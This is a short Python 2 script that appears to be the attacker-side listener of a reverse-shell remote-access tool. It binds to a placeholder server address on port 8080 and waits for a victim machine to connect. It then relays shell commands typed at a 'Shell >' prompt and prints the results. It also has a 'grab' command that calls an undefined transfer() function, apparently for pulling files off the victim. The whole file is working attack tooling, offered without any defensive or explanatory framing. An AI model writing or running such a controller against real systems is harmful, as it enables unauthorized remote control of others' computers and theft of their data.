import socket

def connect():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind(('#server-ip', 8080))
  s.listen(1)
  conn, addr = s.accept()
  print '[+] connection from: ', addr
  
  while True:
    command = raw_input('Shell > ')
    if 'terminate' in command:
      conn.send('terminate')
      conn.close()
      break
    elif 'grab' in command:
      transfer(conn,command)
    else:
      conn.send(command)
      print conn.recv(1024)

def main():
  connect()

main()
